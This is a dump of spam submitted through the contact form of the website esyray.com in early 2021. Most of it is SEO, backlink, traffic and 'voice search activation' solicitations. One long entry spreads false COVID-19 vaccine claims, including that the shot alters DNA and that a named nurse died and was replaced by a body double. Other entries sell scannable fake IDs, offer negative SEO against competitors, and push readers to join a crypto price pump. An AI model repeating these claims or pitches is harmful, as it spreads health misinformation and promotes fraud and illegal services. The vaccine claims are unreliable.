
Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://alexadirectory.link/abcc1/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Rideout
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://alexadirectory.link/out.php?site=esyray.com
+++ 2021-01-20 08:31:32 PM -- Email from: Deloris Lane, -- subject: Social Signals Marketing - Grow your business's social media authority., -- email: deloris.lane@gmail.com, -- Message is: Good evening - esyray.com,

Imagine a community where people share and discuss things they like. When we are about to decide, we consult our friends and other experienced people to get good advice and recommendations from all parties and arrive to the best solution. The concept of guidance has come to search engines in the form of &quot;Social Signal&quot;. All of your Likes, Tweets, Pins &amp; Shares are considered by search engines as votes of trust. Social Signals, as a result, act like human recommendations for your website.
Check what we are able to do for you: 
https://your-pc-specialist.com/socialsignals
Kind regards,
+++ 2021-01-22 12:21:11 AM -- Email from: Mike Berrington, -- subject: Local SEO for more business, -- email: no-replysnumb@gmail.com, -- Message is: Howdy 
 
I have just checked  esyray.com for the Local ranking keywords and seen that your website could use a push. 
 
We will increase your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our plans here, we offer SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
Start increasing your local visibility with us, today! 
 
regards 
Mike Berrington
 
Speed SEO Digital Agency 
support@speed-seo.net
+++ 2021-01-22 09:51:06 PM -- Email from: Vivian Paramor, -- subject: Negative SEO Services, -- email: paramor.vivian72@hotmail.com, -- Message is: Hi

If you ever need Negative SEO work, we offer it right here
https://speed-seo.net/product/negative-seo-service/


thank you
Peter Paramor
Speed SEO Agency
support@speed-seo.net
+++ 2021-01-23 01:29:06 PM -- Email from: Colin Potter, -- subject: Re:Attn.: To Manager, -- email: colin.potter@gmail.com, -- Message is: Good morning people at esyray.com,
Hope you’re good. 
I'm ,
Hope you’re good, and that clients are good. Please allow me to introduce to you this service.
The easiest method to promote an online site. Just enter your site URL, and we will do all the job.
https://1borsa.com/websitesubmitter771536
Regards,
+++ 2021-01-23 05:25:05 PM -- Email from: Kati Karatz, -- subject: Kelley Bergman, -- email: Ode88078@gmail.com, -- Message is: Want to know about ads that costs less than $50 monthly and sends thousands of web visitors for your niche directly to your website? Check out: http://bit.ly/traffic-targeted-for-you
+++ 2021-01-24 01:43:35 AM -- Email from: Kari Whitt, -- subject: COVID-19 Vaccination Causing Paralysis, Convulsions, And Death - Videos and Proof Inside!, -- email: kari.whitt@gmail.com, -- Message is: The New Normal 2021 Documentary (watch the free vimeo movie down below)
https://player.vimeo.com/external/498284641.hd.mp4?s=3a6234c425782534e4367f9bf90e14bafa23ee48

C-19 Vaccination : Anecdotal Side Effects 
Biggest Info Dump on Extremely Harmful COVID Vaccines. Testimonies and Experiences from those who took it: https://prezi.com/i/byzl22mqwfaa/compilation-of-cv-experiences/

Biggest consensus from this info is to not take the vax. Its very dangerous! Why take a vaccine when COVID survival rate is above 99%? The media focuses on cases rather than deaths....why is that? Also, there are more deaths overall relating to other fatalities/diseases (cancer, heart problems, etc) than there is COVID. This is not a &quot;vaccine&quot;, this is an mRNA shot. It changes your DNA for the worse, not better.

You can’t sue Pfizer or Moderna if you have severe Covid vaccine side effects. The government likely won’t compensate you for damages either
https://www.cnbc.com/2020/12/16/covid-vaccine-side-effects-compensation-lawsuit.html

Who is Tiffany Dover? This is Tiffany Dover:
https://youtu.be/JqJ_jZAJn9g

Proof that Tiffany Pontes Dover is dead. She has not released a video of her current status in almost 2 weeks after taking the vaccine on any social media platform, and the place see was employed at, is covering up her death. More details down below.

https://www.youtube.com/watch?v=r7lSlDjdtSM&amp;feature=youtu.be

Part 2 https://www.youtube.com/watch?v=ylhq-fnMV00&amp;feature=youtu.be

CHI Memorial hospital posted the video on twitter but because of questions and backlash, they have put their twitter account on private. You can see by the url structure, it directs to the CHI Memorial twitter post but since their account is on private, you can't view the 20 second video post, but can see the replying comments from the video.

https://twitter.com/CHI_Memorial/status/1341096246304530432 (tweet has been taken down)

CHI Memorial twitter account has been protected because of the backlash (https://twitter.com/CHI_Memorial)

Because the twitter video is on private, CHI Memorial posted the video also on youtube in which the link is here https://www.youtube.com/watch?v=wxGR3y0gE_0&amp;feature=youtu.be

TIFFANY DOVER DEAD? ALIVE FOUR DAYS LATER?! 
https://youtu.be/ylhq-fnMV00

Whats strange is the &quot;tiffany&quot; person in the 20 second video has her hair parted in the middle instead of the side, this person looks bigger in weight and more broad in the shoulders, etc. So here are side by side pictures of the real Tiffany dover, and her body double.

Aside from that, she hasn't posted to social media at all. And futhermore all her pictures show her hair parted to 1 side, and never in the middle. You can follow her facebook profile here: https://www.facebook.com/tiffany.dover.520

And this is her instagram here: https://www.instagram.com/tiffany_dover_/

Another nurse gets Bells Palsy from COVID-19 Vaccination
https://youtu.be/wL2Hc1IzUsc
Backup Vid: https://www.brighteon.com/7885dab0-3cfe-4f2d-88d7-6946a495ff72

Woman shaking uncontrollably from Moderna COVID-19 Vaccination
https://www.facebook.com/100038260334778/videos/403541087597899/
Backup Vid: https://youtu.be/Iubyiy6zQRc

Her Tongue Spasms
https://www.facebook.com/100038260334778/videos/403540964264578/
Backup Vid: https://www.bitchute.com/video/FsPzxUAU2v8B/

FYI: Facebook deleted her update video on her profile, thus the video being uploaded on another persons facebook profile.

Update Video From Her Condition
https://www.facebook.com/100002078982893/videos/3608465825899348/
Backup Vid: https://www.bitchute.com/video/fIYmNXU0Qo0S/

Her facebook profile:
https://www.facebook.com/shawn.skelton.73

Another woman shaking uncontrollably after Pfizer vaccine shot (facebook and youtube deleted the videos so here are some backups)
https://www.bitchute.com/video/W5GSVv7iK5mb/
Backup Vid: https://www.bitchute.com/video/aHVaJnlwYzcE/

Here is a new one that hasn't been deleted:
https://www.facebook.com/100021818644998/videos/902104703860143/

Update 1-12-21
Mom Is getting even worse today and still don't have any answers from doctors as to how to fix this. Please pray for her I can't stand to see my mom this way it makes me want to cry knowing I can't do anything to help her. Please don't take the covid19 vaccine. I'm adding a 3rd video that she just sent me.

Son who posted the video of his moms vaccine shot side effects facebook profile:
https://www.facebook.com/brant.griner.7

More than 20 dead in Norway after Pfizer vaccine: report
https://nationworldnews.com/more-than-20-dead-in-norway-after-pfizer-vaccine-report/

https://norwaytoday.info/news/norwegian-medicines-agency-links-13-deaths-to-vaccine-side-effects-those-who-died-were-frail-and-old/

13 Israelis suffer FACIAL PARALYSIS after taking Pfizer Covid jab, amid influx of reports detailing adverse effects
https://www.rt.com/news/512736-israel-facial-paralysis-13-covid-vaccine/

EXCLUSIVE: Wife of 'perfectly healthy' Miami doctor, 56, who died of a blood disorder 16 days after getting Pfizer Covid-19 vaccine 
https://www.dailymail.co.uk/news/article-9119431/Miami-doctor-58-dies-three-weeks-receiving-Pfizer-Covid-19-vaccine.html

Portuguese Health Worker, Dies Two Days After Receiving Pfizer COVID-19 Vaccine Shot
https://in.news.yahoo.com/sonia-acevedo-portuguese-health-worker-103452201.html

Revelation 13:16-18 King James Version (KJV)
16 And he causeth all, both small and great, rich and poor, free and bond, to receive a mark in their right hand, or in their foreheads:
17 And that no man might buy or sell, save he that had the mark, or the name of the beast, or the number of his name.
18 Here is wisdom. Let him that hath understanding count the number of the beast: for it is the number of a man; and his number is Six hundred threescore and six.

If you take the Mark of the Beast, this is what happens:
Revelation 14:9-11 King James Version (KJV)
9 And the third angel followed them, saying with a loud voice, If any man worship the beast and his image, and receive his mark in his forehead, or in his hand,
10 The same shall drink of the wine of the wrath of God, which is poured out without mixture into the cup of his indignation; and he shall be tormented with fire and brimstone in the presence of the holy angels, and in the presence of the Lamb:
11 And the smoke of their torment ascendeth up for ever and ever: and they have no rest day nor night, who worship the beast and his image, and whosoever receiveth the mark of his name.

If you refuse the Mark of the Beast, this is what happens
Revelation 20:4 King James Version (KJV)
4 And I saw thrones, and they sat upon them, and judgment was given unto them: and I saw the souls of them that were beheaded for the witness of Jesus, and for the word of God, and which had not worshipped the beast, neither his image, neither had received his mark upon their foreheads, or in their hands; and they lived and reigned with Christ a thousand years.

Repent of your sins, trust and have faith in Jesus Christ, read your Bible, and be water baptised in Jesus name.

Free Bible link: https://my.bible.com/bible/1/MAT.1.KJV

To truly know what will happen in the end days, read the revelation portion of the Bible. Here is the link to that, its a very short read (22 pages in total): https://www.bible.com/bible/1/REV.1.KJV

For God so Loved the world, that He gave His only begotten Son, that whosoever believeth in Him should not perish, but have Everlasting Life. -John 3:16 KJV

Jesus saith unto him: &quot;I AM The Way, The Truth and The Life, no man (no one) cometh to The Father but by Me.&quot; -John 14:6 KJV

That if thou shalt confess with thy mouth The Lord Jesus, and shalt believe in thine heart that God hath raised Him from the dead, thou shalt be saved. For with the heart man believeth unto righteousness; and with the mouth confession is made unto salvation. -Romans 10:9,10 KJV

Whosoever denieth The Son, the same hath not The Father; he that acknowledgeth The Son hath The Father also. -1 John 2:23 KJV

Whosoever shall confess that Jesus is The Son of God, God dwelleth in him and he in God. -1 John 4:15 KJV

He that believeth on The Son of God hath the witness in himself; he that believeth not God hath made Him a liar; because he believeth not the record that God gave of His Son.
And this is the record, that God hath given to us Eternal Life, and this Life is in His Son.
He that hath The Son hath Life; and he that hath not The Son of God hath not Life.
-1 John 5:10-12 KJV

And from Jesus Christ, who is The Faithful Witness, and The First begotten of the dead, and The Prince of the kings of the earth. Unto Him that loved us, and washed us from our sins in His own Blood and hath made us kings and priests unto God and His Father; to Him be glory and dominion for ever and ever Amen. -Revelation 1:5 and 6 KJV

Be it known unto you all, and to all the people of Israel, that by The Name of Jesus Christ of Nazareth, whom ye crucified, whom God raised from the dead, even by Him doth this man stand here before you whole. This is The Stone which was set at nought of you builders, which is become the Head of the Corner. Neither is there salvation in any other; for there is none other Name under heaven given among men, whereby we must be saved. Acts 4:10-12 KJV

Wherefore God also hath highly exalted Him, and given Him a Name which is above every name; That at The Name of Jesus every knee should bow, of things in heaven, and things in earth, and things under the earth; and that every tongue should confess that Jesus Christ is Lord, to the glory of God The Father. -Philippians 2:9-11 KJV

The Bible says:
And I heard a loud voice saying in heaven, &quot;Now salvation, and strength, and the kingdom of our God, and the power of His Christ have come, for the accuser of our brethren, who accused them before God day and night, has been cast down.
And they overcame him by The Blood of The Lamb, and by the word of their testimony; and they loved not their lives unto the death. - Revelation 12:10,11 KJV
+++ 2021-01-25 08:17:00 AM -- Email from: Mike Scott, -- subject: affordable monthly SEO plans, -- email: no-reply@google.com, -- Message is: Hello 
 
I have just took a look on your SEO for  esyray.com for its SEO metrics and saw that your website could use a boost. 
 
We will increase your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our services below, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start improving your sales and leads with us, today! 
 
regards 
Mike Scott
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-01-25 09:43:16 PM -- Email from: Carrol Carls, -- subject: Your Facebook Likes, -- email: carrol.carls@gmail.com, -- Message is: Good evening - esyray.com,

Imagine a community where people share and discuss things they like. When we are about to decide, we consult our friends and other experienced people to get good advice and recommendations from all parties and arrive to the best solution. The concept of guidance has come to search engines in the form of &quot;Social Signal&quot;. All of your Likes, Tweets, Pins &amp; Shares are considered by search engines as votes of trust. Social Signals, as a result, act like human recommendations for your website.
Check what we can perform for you: 
http://fund.school/socialsignals819670
With warm regards,
+++ 2021-01-26 07:57:19 AM -- Email from: Arturo Golden, -- subject: , -- email: arturo.golden@gmail.com, -- Message is: Are you looking to promote your website for absolutely no charge? Check this out: http://www.zerocost-ad-posting.xyz
+++ 2021-01-26 08:03:39 AM -- Email from: Jack Grieve, -- subject: , -- email: grieve.jack@gmail.com, -- Message is: Get visitors to your online or offline business at zero cost. This post shows 5 cool ways to get lots of free ad exposure for your business: https://bit.ly/5waystoadvertisefree
+++ 2021-01-27 08:56:13 AM -- Email from: Trula Bernes, -- subject: Ema Pocklington, -- email: Entler43282@gmail.com, -- Message is: Do you need more people ready to buy for your website? We can deliver niche targeted traffic precisely for your specific type of business For more info Visit: http://bit.ly/fast-niche-targeted-traffic
+++ 2021-01-28 03:01:37 AM -- Email from: Leatha Stine, -- subject: Question, -- email: leatha.stine@msn.com, -- Message is: Hello,

Are you presently utilizing Wordpress/Woocommerce or perhaps do you plan to implement it eventually ? We currently offer more than 5000 premium plugins and also themes to down load : http://amurl.fun/GeheC

Thank You,

Leatha
+++ 2021-01-28 03:43:12 AM -- Email from: Ali Jordan, -- subject: quick question about esyray.com, -- email: ali+b3@engagerbots.com, -- Message is: Dear Sir/Madam,

I'm sorry to trouble you. Would you be so kind to please pass this message to who  is in charge of leads generation and marketing for esyray.com and  just how I might get in touch with?

Thank you.

With kind regards,
Ali Jordan
Ali@engagerbots.com

Chatbot Software Specialist at https://Engagerbots.com

PS Go to https://Engagerbots.com where you will find over 200 sample chatbots you can use including lead generation, industry specific bots, customer service automation, appointment booking and every kind of automation packed, efficiency boosting chatbot out there! 


If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/e?d=esyray.com
+++ 2021-01-28 10:39:37 AM -- Email from: Lindsay Harrison, -- subject: Important Reminder, -- email: lindsay@topalexadirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://topalexadirectory.top/abcc1/?=esyray.com


Lindsay
Voice Activation Follow-up Specialist
Top Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://topalexadirectory.top/out.php?site=esyray.com
+++ 2021-01-28 10:49:32 PM -- Email from: ShawnVom, -- subject: 歷史, -- email: ahmedkirillov5@gmail.com, -- Message is: &lt;a href=http://zrenieblog.ru/&gt;Detail&lt;/a&gt;:  &lt;a href=http://zrenieblog.ru/&gt;http://zrenieblog.ru/&lt;/a&gt;  http://zrenieblog.ru/ &lt;a href=&quot;http://zrenieblog.ru/&quot;&gt;http://zrenieblog.ru/&lt;/a&gt; 
歷史 
六七千年前的先民就開始釣魚。周文王曾和兒子們在靈沼釣魚取樂。戰國時范蠡也愛釣魚，常把所釣之魚供給越王勾踐食用。 二十世紀八十年代，中國大陸的各級釣魚協會成立，釣魚地點也從自然水域向養殖水域過度，所釣之魚則從粗養向細養過度。人數增多、水體污染及濫捕濫撈導致釣魚難度上升。釣魚協會開始與漁民和農民簽訂文件，使更多釣者能夠在養殖水域釣魚，達到了雙贏的目的。 二十世紀九十年代初，來自台灣的懸釣法走紅大陸，各地開始建造標準釣池。 二十世紀末，發達國家的釣者提倡回顧自然，引發新一輪野釣戰，而中國的釣者則更青睞精養魚池。&lt;&gt;] 
 
工具 
 
一种钓鱼竿机械部分示意图 
最基本的钓具包括：鱼竿、鱼线、鱼钩、沉坨（又名沉子）、浮标（又名鱼漂）、鱼饵。&lt;&gt;]:1其他辅助钓具包括：失手绳、钓箱、线轮、抄网、鱼篓、渔具盒、钓鱼服、钓鱼鞋等。&lt;&gt;]:1 
 
钓竿一般由玻璃纖維或碳纖維轻而有力的竿状物质製成，钓竿和鱼饵用丝线联接。一般的鱼饵可以是蚯蚓、米饭、蝦子、菜叶、苍蝇、蛆等，现代有专门制作好（多数由自己配置的半成品）的粉製鱼饵出售。鱼饵挂在鱼鉤上，不同的對象鱼有不同的釣組配置。在周围水面撒一些誘餌通常会有較好的集魚效果。 
 
钓具 
鱼竿 
主条目：鱼竿 
钓鱼的鱼竿按照材质包括：传统竹竿、玻璃纤维竿、碳素竿，按照钓法包括：手竿、矶竿、海竿（又名甩竿），按照所钓鱼类包括：溪流小继竿、日鲫竿（又名河内竿）、鲤竿、矶中小物竿。&lt;&gt;]:6-8 
 
鱼钩 
主条目：鱼钩 
鱼钩就是垂钓用的钩，主要分为：有倒钩、无倒钩、毛钩。&lt;&gt;]:14 
 
鱼线 
主条目：鱼线 
鱼线就是垂钓时绑接鱼竿和鱼钩的线，历史上曾使用蚕丝（远古日本）、发丝（江户时期日本）、马尾（西欧）、二枚贝（地中海）、蛛网丝（夏威夷）、琼麻（东南亚）、尼龙钓线（美国）。&lt;&gt;]:25 
 
鱼漂 
主条目：鱼漂 
鱼漂又名浮标，垂钓时栓在鱼线上的能漂浮的东西，主要用于搜集水底情报，查看鱼汛，观察鱼饵存留状态，以及水底水流起伏变化。&lt;&gt;]:36 
 
鱼饵 
主条目：鱼饵 
鱼饵分为诱饵和钓饵，是一种用来吸引鱼群和垂钓时使用的物品，钓饵分为荤饵、素饵、拟饵、拉饵。&lt;&gt;]:170 
 
沉子 
主条目：沉子 
沉子又名沉坨、铅锤，是一种调节鱼漂的工具。&lt;&gt;]:45 
 
卷线器 
主条目：卷线器 
卷线器主要安装在海竿和矶竿上的一种卷线的工具。&lt;&gt;]:63 
 
连结具 
主条目：连结具 
连结具是连结鱼线与钓竿、母线与子线的一种连结物，使用最广泛的是连结环。&lt;&gt;]:55 
 
识鱼 
鱼类的视力不如人类，距离、宽度均无法和人类的视力比较，鱼类对水色、绿色比较敏感，鱼类的嗅觉非常灵敏，鱼类的听觉也非常灵敏，钓鲤鱼时，不能在岸上大声谈笑、走动不停，鱼类的思考能力非常弱，鱼类应对周边环境随着气象、水温、水色、潮流、流速、水量的变化而变化，于是便出现了在同一个池塘、水库、湖泊，往日钓鱼收获大，今日少，上午收获大，下午少，晴天大，雨天少等情况。&lt;&gt;]:114-117淡水钓鱼，中国大陆经常垂钓的鱼类对象是本地鲫鱼、日本鲫、非洲鲫、鲤鱼、游鱼、罗非鱼、黄刺鱼（黄鸭叫）、黄尾、鳊鱼、青鱼、草鱼、鲢鱼、鳙鱼，台湾经常垂钓的鱼类对象是本地鲫鱼、日本鲫、吴郭鱼（罗非鱼）、溪哥仔和红猫（粗首马口鱲）、斗鱼、罗汉鱼、苦花、三角姑（河鮠）、竹蒿头（密鱼）。&lt;&gt;]:117 
 
影响鱼类的6大因素主要是：季节变更、气温高低、水的涨落、风的大小、水的清浊、天气阴晴
+++ 2021-01-31 07:21:03 AM -- Email from: Marla Gopinko, -- subject: Buy Scannable Fake ID, -- email: info@topfakeid.com, -- Message is: Buy Scannable Fake ID – Premium
Fake IDs
Buy our premium fake IDs with the best security elements.
All of our fake ID comes with Scannable features &amp; guaranteed to pass under UV.

Read our reviews and testimonials
https://www.trustpilot.com/review/topfakeid.com
https://www.scamadviser.com/check-website/topfakeid.com
https://www.sitejabber.com/reviews/topfakeid.com
+++ 2021-01-31 05:50:59 PM -- Email from: Olivia Johnson, -- subject: This crypto might go up 10 times in price on 1st Feb 2021, -- email: no-reply@nooooo-reply.com, -- Message is: Gd'Day Mate!

A big group of retail traders (the retail investors like you and me) in social media platform 

Reddit WallStreetBets took on Wall Street Giants in the Gamestop saga.

Their mission has two main goals: Drive up stock prices to score profits for themselves, and at 

the same time, force the establishment investors to abandon bearish bets against struggling 

companies such as GameStop (GME), AMC (AMC), Macy's (M) and several others.

Gamestop's stock price was $18.80 as of 31st Dec 2020 and by 29th Jan 2021, it closed at $325 - 

a whopping 18 times!

https://edition.cnn.com/2021/01/30/business/gamestop-reddit-rebellion-explained/index.html

Subsequently the total number of users in Reddit grew from 2 million users to 7.2 million users 

within days.


https://www.reddit.com/r/wallstreetbets/

Now, it seems like they are targeting to push the price of Cryptocurrency (Ripple XRP) on 1st 

Feb.

This is their thread:
https://www.reddit.com/r/wallstreetbets/comments/l69h57/xrp_to_the_moon/

Already, XRP's price has gone up by more than 50% since this news.

https://www.investing.com/news/cryptocurrency-news/xrp-price-gains-86-after-wall-street-bets-

crypto-wing-says-pump-it-2404272

If you are interested to get involved with cryptos and consider joining this action, you can buy 

XRP at the world's biggest and most established crypto exchange Binance at the link below:
http://bit.ly/2L6ZySg
+++ 2021-02-01 05:18:52 AM -- Email from: Olivia Johnson, -- subject: This crypto might go up 10 times in price on 1st Feb 2021, -- email: no-reply@nooooo-reply.com, -- Message is: A big group of retail traders (the retail investors like you and me) in social media platform Reddit WallStreetBets took on Wall Street Giants in the Gamestop saga.

Their mission has two main goals: Drive up stock prices to score profits for themselves, and at the same time, force the establishment investors to abandon bearish bets against struggling companies such as GameStop (GME), AMC (AMC), Macy's (M) and several others.

Gamestop's stock price was $18.80 as of 31st Dec 2020 and by 29th Jan 2021, it closed at $325 - a whopping 18 times!

https://edition.cnn.com/2021/01/30/business/gamestop-reddit-rebellion-explained/index.html

Subsequently the total number of users in Reddit grew from 2 million users to 7.2 million users within days.


https://www.reddit.com/r/wallstreetbets/

Now, it seems like they are targeting to push the price of Cryptocurrency (Ripple XRP) on 1st Feb.

This is their thread:
https://www.reddit.com/r/wallstreetbets/comments/l69h57/xrp_to_the_moon/

Already, XRP's price has gone up by more than 50% since this news.

https://www.investing.com/news/cryptocurrency-news/xrp-price-gains-86-after-wall-street-bets-crypto-wing-says-pump-it-2404272

If you are interested to get involved with cryptos and consider joining this action, you can buy XRP at the world's biggest and most established crypto exchange Binance at the link below:
http://bit.ly/2L6ZySg
+++ 2021-02-01 06:49:07 AM -- Email from: , -- subject: Do you know people you are dealing with?, -- email: sales1@astrologicalstudio.com, -- Message is: Dear Madam, Dear Sir Do you know personalities of people you are dealing with like potential partners, spouses, friends, employers, employees, business partners, etc.? We can prepare a precise analysis of a personality for all people of your interest for you. You will find there a lot of very valuable information about people of your interest and you will be able to choose best people easily. Please visit astrologicalstudio.com for more information. We will be very pleased to hear from you. Have a great day. Best regards Brian WRIGHT Eng., ASTROLOGICAL STUDIO, Denver, CO, sales@astrologicalstudio.com, https://astrologicalstudio.com
+++ 2021-02-01 10:05:46 AM -- Email from: Valentin Baeza, -- subject: Get some Verified Google Reviews for esyray.com, -- email: valentin.baeza@hotmail.com, -- Message is: Good Afternoon,
I'm ,
How are you doing regarding your Business Reviews?
Google reviews influence purchase decisions. Online Google reviews may be exactly what a consumer has to push them from consideration to get.
https://jtbtigers.com/googlereviews902249
Kind Regards,

P.S.We wish you thousands of clients this year.
+++ 2021-02-01 05:18:05 PM -- Email from: Ernestine Hellyer, -- subject: , -- email: ernestine.hellyer@gmail.com, -- Message is: Want to find out how to get zero cost traffic for your site? Let me show you five high volume traffic sites where you can advertise your site without paying a penny: https://bit.ly/free-traffic-and-sales
+++ 2021-02-03 06:10:21 AM -- Email from: , -- subject: Do you want to know when in a best time to undergo your surgery or a medical treatment?, -- email: sales1@astrologicalstudio.com, -- Message is: Dear Madam, Dear Sir Are you interested to know when is a best time to undergo your surgery or a medical treatment? If so, we can prepare our Forecast of Events report for you, your loved ones or friends. Our exclusive Forecast of Events reports contains this very important information which can help you in this matter. In case of you interest you can order these Forecast of Events reports at https://astrologicalstudio.com/home/23-1-year-forecast-of-events.html. We will be very pleased to hear from you. Have a great day. Best regards Brian WRIGHT Eng., ASTROLOGICAL STUDIO, Denver, CO, sales@astrologicalstudio.com, https://astrologicalstudio.com
+++ 2021-02-04 05:12:21 AM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.link, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://alexadirectory.link/abcc1/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Rideout
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://alexadirectory.link/out.php?site=esyray.com
+++ 2021-02-04 11:04:07 AM -- Email from: Jay McDonald, -- subject: quick question about esyray.com, -- email: jay+m1@mysaleswriter.com, -- Message is: Hi,

I'm sorry to trouble you. Would you be so kind as to tell me who  is in charge of copy writing and content creation for esyray.com  as well as  just how I might  contact?

As a thank you for reading my message and a way to hopefully provide some value for you, can I invite you to take my completely free, no strings attached fill in the blanks professional sales letter template that can be used for traditonal sales pages and letters, video sales letters and persuasive website content. Just go to MySalesWriter.com now.

I specialise in fill in the blanks sales script templates and bespoke scripts using hall of fame copywriter principles to take the headache and guess work out of content creation for you. 

In addition to custom and template sales letters, I also provide custom and templated:

1. Full email series to establish your client relationships and maximise sales

2. Sales phone call scripts to hit your sales targets 

4. Crazy converting website sales copy 

5. Attention grabbing Google adword
 and Facebook ads

6. Slick, memorable video sales letters

7. Lead grabbing optin pages and sales boosting upsell scripts

8. Professional webinar presentations and webinar promotion material

9. Attention getting headlines and call to actions (CTA)

10. Complete product follow up email series

11. Blog content creation and management 

12. Ebook creation

If you be interested in checking out some samples of my work please visit MySalesWriter.com. You can also pick up your completely free sales script template you can use to drive leads and sales right away.

I am passionate about bringing usually reserved for big corporations to smaller, often family run, operations. 

Thank you very much.

With best regards,

Jay McDonald
Jay@mysaleswriter.com

Sales Script Scribe at https://MySalesWriter.com

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/m?d=esyray.com
+++ 2021-02-05 05:01:38 PM -- Email from: Brianmar, -- subject: TOP CARS IN USA, -- email: eevgenyy86@gmail.com, -- Message is: Please check our car store: http://benedict-auto.com/
+++ 2021-02-06 05:34:08 AM -- Email from: Erica Jackson, -- subject: DA50 Backlink to esyray.com, -- email: ericajacksonmi0@yahoo.com, -- Message is: Hi, 

We're wondering if you'd be interested in a 'dofollow' backlink to esyray.com from our DA50 website?

Our website is dedicated to facts/education, and so can host articles on pretty much any topic.

You can either write a new article yourself, or we can link from existing content. The price is just $45 and you can pay once the article/link has been published. This is a one-time fee, so there are no extra charges.

If you're interested, please reply to this email, including the word 'interested' in the Subject Field.

Not sure what DA is? Have a read here: https://moz.com/learn/seo/domain-authority

Kind Regards,
Erica
+++ 2021-02-07 02:57:45 PM -- Email from: Eric Jones, -- subject: instead, congrats, -- email: ericjonesonline@outlook.com, -- Message is: Good day, 

My name is Eric and unlike a lot of emails you might get, I wanted to instead provide you with a word of encouragement – Congratulations

What for?  

Part of my job is to check out websites and the work you’ve done with esyray.com definitely stands out. 

It’s clear you took building a website seriously and made a real investment of time and resources into making it top quality.

There is, however, a catch… more accurately, a question…

So when someone like me happens to find your site – maybe at the top of the search results (nice job BTW) or just through a random link, how do you know? 

More importantly, how do you make a connection with that person?

Studies show that 7 out of 10 visitors don’t stick around – they’re there one second and then gone with the wind.

Here’s a way to create INSTANT engagement that you may not have known about… 

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know INSTANTLY that they’re interested – so that you can talk to that lead while they’re literally checking out esyray.com.

CLICK HERE http://www.talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be a game-changer for your business – and it gets even better… once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately (and there’s literally a 100X difference between contacting someone within 5 minutes versus 30 minutes.)

Plus then, even if you don’t close a deal right away, you can connect later on with text messages for new offers, content links, even just follow up notes to build a relationship.

Everything I’ve just described is simple, easy, and effective. 

CLICK HERE http://www.talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://www.talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-02-07 06:56:28 PM -- Email from: Alejandra Beltran, -- subject: Your Facebook Shares for esyray.com, -- email: beltran.alejandra@msn.com, -- Message is: Hi - esyray.com,

Imagine a community where people share and discuss things they like. When we are about to decide, we consult our friends and other experienced people to get good advice and recommendations from all parties and arrive to the best solution. The concept of guidance has come to search engines in the form of &quot;Social Signal&quot;. All of your Likes, Tweets, Pins &amp; Shares are considered by search engines as votes of trust. Social Signals, as a result, act like human recommendations for your website.
Check what we can perform for you: 
https://jtbtigers.com/socialsignals450057
Kind regards,
+++ 2021-02-09 03:49:24 AM -- Email from: Debbie Tanner, -- subject: Go Here To Review Our Service, -- email: tanner@thelocation3.com, -- Message is: Go Here To Review Our Service

Hi,

Thelocation3 is a website that collects opinions from webmasters/bloggers/business owners for Bing, Bluehost, etc.

We are looking for people like you to test our website.

They spend *,000,000,000 dollars each year collecting data, and then improving their products. 
Thelocation3 pays to each member $ *** daily for their opinions.

Interested? Click here:  https://www.thelocation3.com/getcash

Looking forward to hearing from you,

Debbie Tanner

^^^^^^^^
Unsubscribe: https://www.thelocation3.com/unsubscribe
+++ 2021-02-09 07:08:27 AM -- Email from: Cindi Haskell, -- subject: , -- email: cindi.haskell89@gmail.com, -- Message is: Howdy

I have just checked domain: esyray.com for its SEO Trend and saw that your website could use a boost.

We will increase your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support.

Please check our plans here, we offer SEO at cheap rates. 
https://speed-seo.net/product/monthly-seo-package/

Start enhancing your sales and leads with us, today!

regards
Mike Haskell
Speed SEO Digital Team
support@speed-seo.net
+++ 2021-02-09 10:05:41 AM -- Email from: Mike Owen, -- subject: Increase sales for esyray.com, -- email: see-email-in-message@monkeydigital.co, -- Message is: Hi there 
 
Do you want a quick boost in ranks and sales for your esyray.com website? 
Having a high DA score, always helps 
 
Get your esyray.com to have a 50+ points in Moz DA with us today and rip the benefits of such a great feat. 
 
See our offers here: 
https://www.monkeydigital.co/product/moz-da50-seo-plan/ 
 
NEW: 
https://www.monkeydigital.co/product/ahrefs-dr60/ 
 
 
thank you 
Mike Owen
 
support@monkeydigital.co
